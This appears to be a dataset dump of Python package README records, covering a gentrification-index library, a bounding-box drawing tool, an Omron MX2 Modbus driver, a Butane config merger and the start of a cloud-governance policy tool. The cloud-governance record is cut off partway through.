Government – at local, state, and federal lees – creates conditions that facilitate gentrification processes through targeted policy, investment, and subsidies. These conditions enable private actors, such as developers, lenders, builders, and real estate companies, to generate and accumulate wealth in neighborhoods that previously experienced chronic disinvestment[^2]. Together, these actors can “revitalize” a neighborhood, but with profit as their primary motivator, they have little incentive to consider the social and cultural fabric of a neighborhood or the communities that will be able to experience the benefits of their investment. 

Gentrification also requires newcomers. In early stages of gentrification, newcomers, who are often white with lower incomes and high levels of educational attainment, may be drawn to historically disinvested neighborhoods because of their need for affordable housing. These newcomers can serve as a signal of gentrification potential for developers and may advocate for new investment and amenities in their neighborhood. This neighborhood change, in turn, can draw wealthier newcomers who can afford increased housing costs[^2]. 

Gentrification is one cause of displacement. Residents in gentrifying neighborhoods can be forced to move due to increasing costs of rentals, property taxes, and local amenities, which can lead to evictions, foreclosures, and pressure for low-income homeowners to sell well below the market value of their homes to predatory buyers. Even if long-time residents do not physically move, they can experience displacement from their social networks, local culture, and sense of community[^2].   

Researchers have developed many methods to quantify, measure, and predict the complex processgentrification. These methods generally use on multiple indicators at several time periods. Researchers combine these indicators, as well as changes in those indicators over time, into an index that aim to quantify if the area has gentrified, if the area is vulnerable to gentrification, or some of other measure related to their particular theory of gentrification. Indicators often include measures related to race, educational attainment, housing costs, and housing tenure.

We developed this package to allow researchers to explore and compare different gentrification indices for their area of interest. The first version of this package has functions to calculate the indices from Bates (2013)[^3] and Ding et al. (2016)[^4], which both can be calculated from American Community Survey and Census data. 

### Bates (2013)

Bates (2013) calculated three indices using data from three years, each 10 years apart, (years 0-2) that together give a picture of gentrification in an area of interest: vulnerability to gentrification, presence of gentrification-related demographic change, and home value typology. The gentrification-related demographic change index is based on the gentrification index presented in Freeman (2005)[^5].   

#### Bates (2013) - Vulnerability to Gentrification
| Indicator      | Output values |  variable  |
| ------------------------------------ | ------------------------------------------ | -----------  |
| % Renters at census tract and county levels | 0: % Renters in tract < % Renters in county, 1: % Renters in tract > % Renters in county | renter_v  |
| % People of color at census tract and county levels | 0: % People of Color in tract < % People of Color in county, 1: % People of Color in tract > % People of Color in county | poc_v  |
| % People over 25 without a college degree at census tract and county levels | 0: % People over 25 without a college degree in tract < % People over 25 without a college degree in county, 1: % People over 25 without a college degree in tract > % People over 25 without a college degree in county  | nocollege_v  |
| Median Family Income at census tract and county levels | 0: Median Family Income in tract > Median Family Income in county, 1: Median Family Income in tract < Median Family Income in county | mfi_v  |
| **Vulnerability to Gentrification Index** | Score 0-4 (sum of 4 variables above)  |  v_index  |

#### Bates (2013) - Gentrification-Related Demographic Change
| Indicator      | Output values |  variable  |
| ------------------------------------ | ------------------------------------------ | -----------  |
| % Change in renters Year 1-2 at census tract and county levels | 0: % Change in renters in tract < % Renters in county, 1: % Change in renters in tract > % Change in renters in county | tenure_change  |
| % Change in People of color at census tract and county levels | 0: % Change in People of Color in tract < % Change in People of Color in county, 1: % Change in People of Color in tract > % Change in People of Color in county | race_change  |
| % Change in people over 25 without a college degree at census tract and county levels | 0: % Change in people over 25 without a college degree in tract < % Change in people over 25 without a college degree in county, 1: % Change in people over 25 without a college degree in tract > % Change in people over 25 without a college degree in county  | edu_change  |
| % Change in Median Household Income at census tract and county levels | 0: % Change in Median Household Income in tract > % Change in Median Household Income in county, 1: % Change Median Household Income in tract < % Change Median Household Income in county | income_change  |
| **Presence of Gentrification-Related Demographic Change Index**  | Score 0-4 (sum of 4 variables above)  |  dem_change_index  |

#### Bates (2013) - Home Value Typology
| Indicator      | Output values |  Variable  |
| ------------------------------------ | ------------------------------------------ | -----------  |
| Median home value in tract (year 0) | lowmod : bottom 3 quintiles, high: top 2 quintiles | homevalueq_yr0  |
| Median home value in tract (year 1) | lowmod : bottom 3 quintiles, high: top 2 quintiles | homevalueq_yr1  |
| Median home value in tract (year 2) | lowmod : bottom 3 quintiles, high: top 2 quintiles  | homevalueq_yr2  |
| Change in median home value year 0-1 | lowmod : bottom 3 quintiles, high: top 2 quintile | homevalueq_change_01  |
| Change in median home value year 1-2 | lowmod : bottom 3 quintiles, high: top 2 quintile | homevalueq_change_12  |
| Change in median home value year 0-2 | lowmod : bottom 3 quintiles, high: top 2 quintile | homevalueq_change_02  |
| **Home Value Typology Index**  | Each tract has a value of 'adjacent' (low or moderate Year 2 value, low or moderate Year 0 - Year 1 appreciation, touch boundary of one tract with high Year 2 value), 'accelerating' (low or moderate Year 2 value, high Year 1-Year 2 apprecation), 'appreciated' (low or moderate Year 0 value, high Year 2 value, high Year 0 -Year 2 appreciation), or 'no_typology'  |  mhv_type  |

#### Freeman (2005) Gentrification Index
| Indicator      | Output values |  Variable  |
| ------------------------------------ | ------------------------------------------ | -----------  |
| % housing units built in the last 20 years | 0: % new housing units in tract < % new housing in county , 1: % new housing units in tract < % new housing in count | newhouse_f_index  |
| % People over 25 without a college degree at census tract and county levels | 0: % People over 25 without a college degree in tract < % People over 25 without a college degree in county, 1: % People over 25 without a college degree in tract > % People over 25 without a college degree in county  | nocollege_f_index  |
| Median Household Income at census tract and county levels | 0: Median Household Income in tract > Median Household Income in county, 1: Median Household Income in tract < Median Household Income in county | mhi_f_index  |
| Median housing value at tract level years 1-2 | 0: median housing value in year 1 > median housing value in year 2, 1: median housing value in year 1 < median housing value in year 2 | mhv_f_index  |
| Freeman Gentrification Index  | Score 0-4 (sum of 4 variables above)  |  freeman  |

### Ding et al. (2016)

Ding et al. (2016) usese data from 2 years (years 1-2) to calculate one index that classifies tracts as experiencing intense gentrification, moderate gentrification, weak gentrification, no gentrification, or as non-gentrifiable.

#### Ding et a. (2016) - Gentrification Index
| Indicator      | Output values |  Variable  |
| ------------------------------------ | ------------------------------------------------ | -----------  |
| Median Household Income at census tract and county levels | 0 (gentrifiable = False): Median Household Income in tract > Median Household Income in county, 1 (gentrifiable = True): Median Household Income in tract < Median Household Income in county | hhi_crit, gentrifiable  |
| % Change in Median Rent at census tract and county levels | 0: % Change in Median Rent in tract < % Change in Median Rent in county, 0.5: % Change Median Rent in tract > % Change Median Rent in county | rent_crit  |
| % Change in Median Home Value at census tract and county levels | 0: % Change in Median Home Value in tract < % Change in Median Home Value in county, 0.5: % Change Median Home Value in tract > % Change Median Home Value in county | value_crit  |
| % Change in people over 25 without a college degree at census tract and county levels | 0: % Change in people over 25 without a college degree in tract < % Change in people over 25 without a college degree in county, 1: % Change in people over 25 without a college degree in tract > % Change in people over 25 without a college degree in county  | edu_crit  |
| Sum of Gentrification Criteria  |  0 - 3 (Sum of above 4 variables)  | crit  |
| Presence of Gentrification  |  False: crit < 2.5, True: crit>= 2.5  |  gentrifying  |
| **Gentrification Status**  | 'Weak Gentrification': meets gentrification criteria and in bottom two quartiles of criteria for change in median home values and rent, 'Moderate Gentrification': meets gentrification criteria and in middle two quartiles of criteria for change in median home values and rent, 'Strong Gentrification': meets gentrification criteria and in top quartile of criteria for change in median home values and rent, 'No Gentrification': tract is gentrifiable but does not meet gentrification criteria, 'Nongentrifiable': Does not meet income criteria in year 1 to be gentrifiable  |  gent_status  |

Both indices are calculated using data at the census tract level for a single county. This package include functions to directly the pull data from the American Community Survey and Census and their respective Tiger/Line geometries and combine data accross years with conflicting geometries using areal interpolation from the Tobler package. 

## Getting Started

### Dependencies

* Python 3.9.*
* numpy == 1.22.4
* pandas
* geopandas
* folium
* tobler
* branca
* requests


### Installing

```
pip install pygentrification
```
	
### Executing program

## API Calls

This module contains all the data requests a user might need to make to calculate the indices included in the package. This includes using 5 Year - American Community Survery, Dicennial Census, and TIGER Census data.

Each index requires data at the tract level and data for the county as a whole. Identiy the county and state using FIPS codes. 
The two example calls below would return the two dataframes needed to calculate the bates-freeman indices and ding index for Philadelphia County (101) in PA (42) using data from 2000, 2010, and 2020.

The function will return data in EPSG 4269, but requires a proj_parameter that indicates the projected crs that will be used for areal interpolation needed to harmonize data to census tract boundaries for different years.

```
from pygentrification.api_calls import get_api_data_tract, get_api_data_county

tract_gdf = get_api_data_tract(""42"", ""101"", years = [2000, 2010, 2020], indices = [""bates"", ""ding""], proj_crs = ""EPSG: 2272"")

county_gdf = get_api_data_county(""42"", ""101"", years = [2000, 2010, 2020], indices = [""bates"", ""ding""])

```


## Bates and Freeman Indices

This module contains the data prep steps, index calculation, and dataframe creation of the Bates-Freeman index


calc_batesfreeman is a function that calculates the index according to Bates-Freeman, as cited above. If using a GeoDataFrame retrieved with the functions above, an example call would be: 

```
from pygentrification.bates_freeman_indices import calc_bates_freeman

bates_freeman_gdf = calc_batesfreeman(county_gdf, tract_gdf, inplace = False)

```

Users may also use data retrieved in other ways as long as:
* one is a gdf at the tract level of the study area and one is a df or gdf values for the area as a whole 
* each dataset has data for the acs and census variables required for calculating the indices in this script for the years specified. 
* they specify column column names as a list with an order that corresponds exactly with the default values for th cols_tract and cols_area parameters.

```
cols_area = ['area_med_house_inc_yr1', 'area_med_house_inc_e_yr1', 'area_med_house_inc_yr2', 'area_med_house_inc_e_yr2', 'area_med_fam_inc_yr2', 'area_med_fam_inc_e_yr2']
cols_tract = ['pop_tenure_yr1', 'owner_yr1', 'renter_yr1', 'pop_tenure_yr2', 'owner_yr2', 'renter_yr2', 'pop_25_over_yr1', 'ba_degree_m_yr1', 'ma_degree_m_yr1', 'prof_degree_m_yr1', 'doc_degree_m_yr1', 'ba_degree_f_yr1', 'ma_degree_f_yr1', 'prof_degree_f_yr1', 'doc_degree_f_yr1', 'pop_25_over_yr2', 'ba_degree_m_yr2','ma_degree_m_yr2', 'prof_degree_m_yr2', 'doc_degree_m_yr2', 'ba_degree_f_yr2','ma_degree_f_yr2', 'prof_degree_f_yr2', 'doc_degree_f_yr2','pop_race_yr1', 'white_yr1', 'pop_race_yr2', 'white_yr2', 'med_fam_inc_yr2', 'med_home_val_yr0', 'med_home_val_yr1', 'med_home_val_yr2', 'med_house_inc_yr1', 'med_house_inc_yr2', 'tot_house_yr2', 'new_house_col1', 'new_house_col2', 'new_house_col3']
```
    

## Ding Index

This module contains the data prep steps, index calculation, and dataframe creation of the Ding index


calc_batesfreeman is a function that calculates the index according to Ding, as cited above. If using a GeoDataFrame retrieved with the functions above, an example call would be: 

```
from pygentrification.ding_index import calc_ding

ding_gdf = calc_ding(county_gdf, tract_gdf, inplace = False):

``` 

## Folium Maps

This module contains functions to create Folium maps from the output of Bates-Freeman and Ding functions hosted on a local HTML site.

The crs for the input gdf MUST be EPSG: 4269.

This function takes in the GeoDataFrame generated by the calc_batesfreeman function fand outputs and map object of a Folium map. It saves an html file of the map object to the working directory.

```
from pygentrification.folium_funcs import bates_freeman_result_map

bates_freeman_result_map(bates_freeman_gdf, filename = 'bates_freeman_map.html'):
```

This function takes in the GeoDataFrame generated by the calc_ding function fand outputs and map object of a Folium map. It saves an html file of the map object to the working directory.

```
from pygentrification.folium_funcs import ding_result_map 

ding_result_map(ding_gdf, filename = 'ding_map.html'):
```

Users may also use data retrieved in other ways as long as:
* one is a gdf at the tract level of the study area and one is a df or gdf values for the area as a whole 
* each dataset has data for the acs and census variables required for calculating the indices in this script for the years specified. 
* they specify column column names as a list with an order that corresponds exactly with the default values for th cols_tract and cols_area parameters.

```
cols_area = ['area_med_rent_yr1', 'area_med_rent_yr2', 'area_med_home_val_yr1', 'area_med_home_val_yr2', 'area_med_house_inc_yr1', 'area_med_house_inc_yr2']
cols_tract=['med_rent_yr1', 'med_rent_yr2', 'med_home_val_yr1', 'med_home_val_yr2', 'pop_25_over_yr1' 'ba_degree_m_yr1', 'ma_degree_m_yr1', 'prof_degree_m_yr1', 'doc_degree_m_yr1, ba_degree_f_yr1', 'ma_degree_f_yr1', 'prof_degree_f_yr1', 'doc_degree_f_yr1', 'pop_25_over_yr2', 'ba_degree_m_yr2', 'ma_degree_m_yr2', 'prof_degree_m_yr2', 'doc_degree_m_yr2', 'ba_degree_f_yr2', 'ma_degree_f_yr2', 'prof_degree_f_yr2', 'doc_degree_f_yr2', 'med_house_inc_yr1', 'med_house_inc_yr2']
```


## Authors

Contributors names and contact info

Winn Costantini (https://github.com/wcostantini)
Adam Thompson (https://github.com/Lubbles)
Josh Scrabeck (https://github.com/joshscrabeck)

## Version History

* 0.0.1
    *Initial release
* 0.0.2
* 0.0.3
* 0.0.4
* 0.0.5
    * Current Release

## License

This project is licensed under the BSD License - see the LICENSE.txt file for details

## Acknowledgments

Thanks to Lee Hachadoorian and the Temple University Geography and Urban Studies department. 

## References

[^1] Bunten, Devin M. “Untangling the Housing Shortage and Gentrification.” Bloomberg. October 23, 2019. [Link.](https://www.bloomberg.com/news/articles/2019-10-23/untangling-the-housing-shortage-and-gentrificatiom)
[^2] Zuk, Miriam, Ariel H. Bierbaum, Karen Chapple, Karolina Gorska, and Anastasia Loukaitou-Sideris. “Gentrification, Displacement, and the Role of Public Investment.” Journal of Planning Literature 33, no. 1 (February 1, 2018): 31–44. [https://doi.org/10.1177/0885412217716439.](https://doi.org/10.1177/0885412217716439)
[^3] Bates, Lisa. 2013. “Gentrification and Displacement Study: Implementing an Equitable Inclusive Development Strategy in the Context of Gentrification.” Urban Studies and Planning Faculty Publications and Presentations, May. [https://doi.org/10.15760/report-01.](https://doi.org/10.15760/report-01)
[^4] Freeman, Lance. 2005. “Displacement or Succession?: Residential Mobility in Gentrifying Neighborhoods.” Urban Affairs Review 40 (4): 463–91. [https://doi.org/10.1177/1078087404273341.](https://doi.org/10.1177/1078087404273341)
[^5] Ding, Lei, Jackelyn Hwang, and Eileen Divringi. 2016. “Gentrification and Residential Mobility in Philadelphia.” Regional Science and Urban Economics 61: 38–51. [https://doi.org/10.1016/j.regsciurbeco.2016.09.004.](https://doi.org/10.1016/j.regsciurbeco.2016.09.004)
",joshscrabeck/pygentrification
fancybbox,https://github.com/Vprashant/fancybbox,1,1537,1537,"# Fancybbox
[![PyPi version](https://img.shields.io/pypi/v/fancybbox)](https://pypi.org/project/fancybbox/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

A package that allows to build Lib is a package that enables users to create visually appealing bounding boxes for object detection in image processing deep learning projects.  
With a current version of 0.0.10, the package is constantly being updated and improved. The package offers a variety of features, including the ability to customize the appearance of bounding boxes with different colors, line widths, and styles. 
Additionally, it provides users with the flexibility to adjust the size and shape of the bounding boxes to meet their specific needs.'


Developed by Prashant Verma (c) 2023

This project still very much experimental and may change significantly. 

## Install
Install with all dependencies:

```bash
pip install fancybbox
```

## Examples of How To Use (Alpha Version)

Creating A Sample detection function

```python
import cv2
from fancy_bbox import FancyBox

# Load an image
image = cv2.imread(""images/img_1.jpg"")

# Detect an object and get its bounding box coordinates
x, y, w, h = [100, 100, 200, 200]

# Create a FancyBox object and draw it on the image
fancy_box = FancyBox(x, y, w, h, border_thickness=1, border_color=(0, 255, 0))
image_with_box = fancy_box.target_angle_bbox(image)


# Display the image with the box
cv2.imshow(""Fancy Box Example"", image_with_box)
cv2.waitKey(0)
```

","# Fancybbox
[![PyPi version](https://img.shields.io/pypi/v/fancybbox)](https://pypi.org/project/fancybbox/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

A package that allows to build Lib is a package that enables users to create visually appealing bounding boxes for object detection in image processing deep learning projects.  
With a current version of 0.0.10, the package is constantly being updated and improved. The package offers a variety of features, including the ability to customize the appearance of bounding boxes with different colors, line widths, and styles. 
Additionally, it provides users with the flexibility to adjust the size and shape of the bounding boxes to meet their specific needs.'


Developed by Prashant Verma (c) 2023

This project still very much experimental and may change significantly. 

## Install
Install with all dependencies:

```bash
pip install fancybbox
```

## Examples of How To Use (Alpha Version)

Creating A Sample detection function

```python
import cv2
from fancy_bbox import FancyBox

# Load an image
image = cv2.imread(""images/img_1.jpg"")

# Detect an object and get its bounding box coordinates
x, y, w, h = [100, 100, 200, 200]

# Create a FancyBox object and draw it on the image
fancy_box = FancyBox(x, y, w, h, border_thickness=1, border_color=(0, 255, 0))
image_with_box = fancy_box.target_angle_bbox(image)


# Display the image with the box
cv2.imshow(""Fancy Box Example"", image_with_box)
cv2.waitKey(0)
```

",vprashant/fancybbox
pymx2,https://github.com/vpaeder/pymx2,1,2749,2749,"# pymx2

This is a python driver to communicate with an Omron MX2 inverter through Modbus ([manufacturer's page](https://industrial.omron.eu/en/products/mx2)). It is based on datasheet rev.2 (Jan 2013).

## Requirements

- An RS-485 adapter
- [pySerial](https://pypi.org/project/pyserial)

## What is provided

- Commands to handle low-level functions provided by the inverter:
  - Read coil status (01h)
  - Read holding register (03h)
  - Write in coil (05h)
  - Write in holding register (06h)
  - Loopback test (08h)
  - Write in coils (0Fh)
  - Write in holding registers (10h)
  - Read/write in holding registers (17h)
- A list of available coils and registers in the form of enums in mx2.enums:
  - Coil: list of coil addresses
  - ModbusRegisters: registers available only through Modbus
  - StandardFunctions: A group registers as described in datasheet pp. 90-120
  - FineTuningFunctions: B group registers (pp. 121-153)
  - IntelligentTerminalFunctions: C group registers (pp. 153-171)
  - MonitoringFunctions: D group registers (pp. 74-88)
  - MainProfileParameters: F group registers (p. 89)
  - MotorConstantsFunctions: H group registers (pp. 172-178)
  - OtherParameters: P group registers (pp. 179-190)
  - SecondMotorFunctions: registers from different groups assigned to 2nd motor configuration
- Data types to handle returned values and keep tracks of associated coils and registers:
  - CoilValue: holds a reference to a coil address and a boolean value
  - RegisterValue: holds a reference to a register address and an integer value

There are so many separate coils and registers that I didn't find appropriate to create a class method for each of them. Allowed values and units for each register can be found in the relevant datasheet pages. Register sizes are handled automatically.
An exception is made for fault monitors, for which as specific class method is provided.
Several examples are available in the [examples](examples) folder.
API documentation can be found within the code or in the *docs* folder (see [below](#api)).
Don't hesitate to report bugs [here](https://github.com/vpaeder/pymx2/issues).

## Setup

From command line, use:

```bash
python -m setup.py install
```

or for Linux/OSX:

```bash
sudo python -m setup.py install
```

## Examples

See [examples](examples) folder.

## Tests

The [tests](tests) folder contains unit tests for most of the aspects of this package. To run them, use:

```bash
python -m unittest
```

## API

You can find docs in the [docs](docs) folder (generated from python docstrings). Alternatively, you can rely on python docstrings

1) either from the command line, use pydoc:

```bash
python -m pydoc mx2
```

2) or from within python:

```python
import mx2; help(mx2)
```
","# pymx2

This is a python driver to communicate with an Omron MX2 inverter through Modbus ([manufacturer's page](https://industrial.omron.eu/en/products/mx2)). It is based on datasheet rev.2 (Jan 2013).

## Requirements

- An RS-485 adapter
- [pySerial](https://pypi.org/project/pyserial)

## What is provided

- Commands to handle low-level functions provided by the inverter:
  - Read coil status (01h)
  - Read holding register (03h)
  - Write in coil (05h)
  - Write in holding register (06h)
  - Loopback test (08h)
  - Write in coils (0Fh)
  - Write in holding registers (10h)
  - Read/write in holding registers (17h)
- A list of available coils and registers in the form of enums in mx2.enums:
  - Coil: list of coil addresses
  - ModbusRegisters: registers available only through Modbus
  - StandardFunctions: A group registers as described in datasheet pp. 90-120
  - FineTuningFunctions: B group registers (pp. 121-153)
  - IntelligentTerminalFunctions: C group registers (pp. 153-171)
  - MonitoringFunctions: D group registers (pp. 74-88)
  - MainProfileParameters: F group registers (p. 89)
  - MotorConstantsFunctions: H group registers (pp. 172-178)
  - OtherParameters: P group registers (pp. 179-190)
  - SecondMotorFunctions: registers from different groups assigned to 2nd motor configuration
- Data types to handle returned values and keep tracks of associated coils and registers:
  - CoilValue: holds a reference to a coil address and a boolean value
  - RegisterValue: holds a reference to a register address and an integer value

There are so many separate coils and registers that I didn't find appropriate to create a class method for each of them. Allowed values and units for each register can be found in the relevant datasheet pages. Register sizes are handled automatically.
An exception is made for fault monitors, for which as specific class method is provided.
Several examples are available in the [examples](examples) folder.
API documentation can be found within the code or in the *docs* folder (see [below](#api)).
Don't hesitate to report bugs [here](https://github.com/vpaeder/pymx2/issues).

## Setup

From command line, use:

```bash
python -m setup.py install
```

or for Linux/OSX:

```bash
sudo python -m setup.py install
```

## Examples

See [examples](examples) folder.

## Tests

The [tests](tests) folder contains unit tests for most of the aspects of this package. To run them, use:

```bash
python -m unittest
```

## API

You can find docs in the [docs](docs) folder (generated from python docstrings). Alternatively, you can rely on python docstrings

1) either from the command line, use pydoc:

```bash
python -m pydoc mx2
```

2) or from within python:

```python
import mx2; help(mx2)
```
",vpaeder/pymx2
bumerge,https://github.com/kytta/bumerge/,1,2002,1844,"<!--
SPDX-FileCopyrightText: © 2023 Nikita Karamov <me@kytta.dev>
SPDX-License-Identifier: CC-BY-4.0 OR BSD-2-Clause
-->

# bumerge

> Merge Butane configurations

This is a simple Python script that will merge [Butane] configurations from
multiple files into one. Makes your job easier when you manage servers.

- **merges** multiple `.bu` files into one
- **inlines** external files into the configs
- **checks** source configs for errors

bumerge currently supports [Fedora CoreOS Specification v1.5.0][fcos-1.5].
Support for other distributions is planned, but not prioritized.

## Install

```sh
pipx install bumerge  # or pip, or conda, or pipsi, or ...
```

## Use

Just pass the list of the files to the app

```sh
bumerge root.bu modules/time.bu modules/user.bu
```

**Important:** bumerge will perform a deep merge. If there are key conflicts,
the latter file takes precedence.

### Command-line arguments

```sh
usage: bumerge [-h] [--version] [--output FILE] [--variant {fcos}]
               [--spec-version {1.5.0}]
               FILE [FILE ...]

positional arguments:
  FILE                  config files to merge

options:
  -h, --help               show this help message and exit
  --version, -V            show program's version number and exit
  --output FILE, -o FILE   output file. Outputs to stdout by default
  --variant {fcos}         Butane specification variant
  --spec-version {1.5.0}   Butane specification version
```

## Licence

© 2023 [Nikita Karamov]\
Licensed under the [BSD 2-Clause ""Simplified"" License][BSD-2-Clause].

This README can also be licensed under the
[Creative Commons Attribution 4.0 International][CC-BY-4.0]

---

This project is hosted on GitHub:
<https://github.com/kytta/bumerge.git>

[Butane]: https://coreos.github.io/butane/
[BSD-2-Clause]: https://spdx.org/licenses/BSD-2-Clause.html
[CC-BY-4.0]: https://spdx.org/licenses/CC-BY-4.0.html
[fcos-1.5]: https://coreos.github.io/butane/config-fcos-v1_5/
[nikita karamov]: https://www.kytta.dev/
","

# bumerge

> Merge Butane configurations

This is a simple Python script that will merge [Butane] configurations from
multiple files into one. Makes your job easier when you manage servers.

- **merges** multiple `.bu` files into one
- **inlines** external files into the configs
- **checks** source configs for errors

bumerge currently supports [Fedora CoreOS Specification v1.5.0][fcos-1.5].
Support for other distributions is planned, but not prioritized.

## Install

```sh
pipx install bumerge  # or pip, or conda, or pipsi, or ...
```

## Use

Just pass the list of the files to the app

```sh
bumerge root.bu modules/time.bu modules/user.bu
```

**Important:** bumerge will perform a deep merge. If there are key conflicts,
the latter file takes precedence.

### Command-line arguments

```sh
usage: bumerge [-h] [--version] [--output FILE] [--variant {fcos}]
               [--spec-version {1.5.0}]
               FILE [FILE ...]

positional arguments:
  FILE                  config files to merge

options:
  -h, --help               show this help message and exit
  --version, -V            show program's version number and exit
  --output FILE, -o FILE   output file. Outputs to stdout by default
  --variant {fcos}         Butane specification variant
  --spec-version {1.5.0}   Butane specification version
```

## Licence

© 2023 [Nikita Karamov]\
Licensed under the [BSD 2-Clause ""Simplified"" License][BSD-2-Clause].

This README can also be licensed under the
[Creative Commons Attribution 4.0 International][CC-BY-4.0]

---

This project is hosted on GitHub:


[Butane]: https://coreos.github.io/butane/
[BSD-2-Clause]: https://spdx.org/licenses/BSD-2-Clause.html
[CC-BY-4.0]: https://spdx.org/licenses/CC-BY-4.0.html
[fcos-1.5]: https://coreos.github.io/butane/config-fcos-v1_5/
[nikita karamov]: https://www.kytta.dev/
",kytta/bumerge
athiruma-cloud-governance,https://github.com/redhat-performance/cloud-governance,29,14124,14099,"
[![PyPI Latest Release](https://img.shields.io/pypi/v/cloud-governance.svg)](https://pypi.org/project/cloud-governance/)
[![Container Repository on Quay](https://quay.io/repository/projectquay/quay/status ""Container Repository on Quay"")](https://quay.io/repository/ebattat/cloud-governance?tab=tags)
[![Actions Status](https://github.com/redhat-performance/cloud-governance/workflows/Build/badge.svg)](https://github.com/redhat-performance/cloud-governance/actions)
[![Coverage Status](https://coveralls.io/repos/github/redhat-performance/cloud-governance/badge.svg?branch=main)](https://coveralls.io/github/redhat-performance/cloud-governance?branch=main)
[![Documentation Status](https://readthedocs.org/projects/cloud-governance/badge/?version=latest)](https://cloud-governance.readthedocs.io/en/latest/?badge=latest)
[![python](https://img.shields.io/pypi/pyversions/cloud-governance.svg?color=%2334D058)](https://pypi.org/project/cloud-governance)
[![License](https://img.shields.io/pypi/l/cloud-governance.svg)](https://github.com/redhat-performance/cloud-governance/blob/main/LICENSE)


# Cloud Governance

![](images/cloud_governance.png)

## What is it?

**Cloud Governance** tool provides a lightweight and flexible framework for deploying cloud management policies focusing on cost optimize and security.

This tool support the following policies:
[policy](cloud_governance/policy)

[AWS Polices](cloud_governance/policy/aws)

* Real time Openshift Cluster cost, User cost
* [ec2_idle](cloud_governance/policy/aws/ec2_idle.py): idle ec2 in last 4 days, cpu < 2% & network < 5mb.
* [ec2_run](cloud_governance/policy/aws/ec2_run.py): running ec2.
* [ebs_unattached](cloud_governance/policy/aws/ebs_unattached.py): volumes that did not connect to instance, volume in available status.
* [ebs_in_use](cloud_governance/policy/aws/ebs_in_use.py): in use volumes.
* [tag_resources](cloud_governance/policy/policy_operations/aws/tag_cluster): Update cluster and non cluster resource tags fetching from the user tags or from the mandatory tags
* [zombie_cluster_resource](cloud_governance/policy/aws/zombie_cluster_resource.py): Delete cluster's zombie resources
* [tag_non_cluster](cloud_governance/policy/policy_operations/aws/tag_non_cluster): tag ec2 resources (instance, volume, ami, snapshot) by instance name
* [tag_iam_user](cloud_governance/policy/policy_operations/aws/tag_user): update the user tags from the csv file
* [cost_explorer](cloud_governance/policy/aws/cost_explorer.py): Get data from cost explorer and upload to ElasticSearch
* [ip_unattached](cloud_governance/policy/aws/ip_unattached.py): Get the unattached IP and delete it after 7 days.
* [s3_inactive](cloud_governance/policy/aws/s3_inactive.py): Get the inactive/empty buckets and delete them after 7 days.
* [empty_roles](cloud_governance/policy/aws/empty_roles.py): Get empty roles and delete it after 7 days.
* [zombie_snapshots](cloud_governance/policy/aws/zombie_snapshots.py): Get the zombie snapshots and delete it after 7 days.
* [nat_gateway_unused](cloud_governance/policy/aws/nat_gateway_unused.py): Get the unused nat gateways and deletes it after 7 days.
* gitleaks: scan Github repository git leak (security scan)  
* [cost_over_usage](cloud_governance/policy/aws/cost_over_usage.py): send mail to aws user if over usage cost

[IBM policies](cloud_governance/policy/ibm)

* [tag_baremetal](cloud_governance/policy/ibm/tag_baremetal.py): Tag IBM baremetal machines
* [tag_vm](cloud_governance/policy/ibm/tag_vm.py): Tga IBM Virtual Machines machines

** You can write your own policy using [Cloud-Custodian](https://cloudcustodian.io/docs/quickstart/index.html)
   and run it (see 'custom cloud custodian policy' in [Policy workflows](#policy-workloads)).


![](images/cloud_governance1.png)
![](images/demo.gif)

![](images/cloud_governance2.png)

Reference:
* The cloud-governance package is placed in [PyPi](https://pypi.org/project/cloud-governance/)
* The cloud-governance container image is placed in [Quay.io](https://quay.io/repository/ebattat/cloud-governance)
* The cloud-governance readthedocs link is [ReadTheDocs](https://cloud-governance.readthedocs.io/en/latest/)
![](images/cloud_governance3.png)

_**Table of Contents**_

<!-- TOC -->
- [Installation](#installation)
- [Configuration](#configuration)
- [Run AWS Policy Using Podman](#run-aws-policy-using-podman)
- [Run IBM Policy Using Podman](#run-ibm-policy-using-podman)
- [Run Policy Using Pod](#run-policy-using-pod)
- [Pytest](#pytest)
- [Post Installation](#post-installation)

<!-- /TOC -->

## Installation

#### Download cloud-governance image from quay.io
```sh
# Need to run it with root privileges
sudo podman pull quay.io/ebattat/cloud-governance
```

#### Environment variables description:

(mandatory)AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID

(mandatory)AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY

##### Policy name:
(mandatory)policy=ec2_idle / ec2_run / ebs_unattached / ebs_in_use / tag_cluster_resource / zombie_cluster_resource / tag_ec2_resource

##### Policy logs output
(mandatory)policy_output=s3://redhat-cloud-governance/logs

##### Cluster or instance name:
(mandatory policy:tag_cluster_resource)resource_name=ocs-test

##### Cluster or instance tags:
(mandatory policy:tag_cluster_resource)mandatory_tags=""{'Owner': 'Name','Email': 'name@redhat.com','Purpose': 'test'}""

##### gitleaks
(mandatory policy: gitleaks)git_access_token=$git_access_token
(mandatory policy: gitleaks)git_repo=https://github.com/redhat-performance/cloud-governance
(optional policy: gitleaks)several_repos=yes/no (default = no)

##### Choose a specific region or all for all the regions, default : us-east-2
(optional)AWS_DEFAULT_REGION=us-east-2/all (default = us-east-2)

##### Choose dry run or not, default yes
(optional)dry_run=yes/no (default = yes)

##### Choose log level, default INFO
(optional)log_level=INFO (default = INFO)

#### LDAP hostname to fetch mail records
LDAP_HOST_NAME=ldap.example.com

#### Enable Google Drive API in console and create Service account
GOOGLE_APPLICATION_CREDENTIALS=$pwd/service_account.json

# Configuration

### AWS Configuration

#### Create a user and a bucket
* Create user with IAM [iam](iam/clouds)
* Create a logs bucket [create_bucket.sh](iam/cloud/aws/create_bucket.sh)

### IBM Configuration
* Create classic infrastructure API key

## Run AWS Policy Using Podman 
```sh
# policy=ec2_idle
sudo podman run --rm --name cloud-governance -e policy=""ec2_idle"" -e AWS_ACCESS_KEY_ID=""$AWS_ACCESS_KEY_ID"" -e AWS_SECRET_ACCESS_KEY=""$AWS_SECRET_ACCESS_KEY"" -e AWS_DEFAULT_REGION=""us-east-2"" -e dry_run=""yes"" -e policy_output=""s3://bucket/logs"" -e log_level=""INFO"" ""quay.io/ebattat/cloud-governance""

# policy=ec2_run
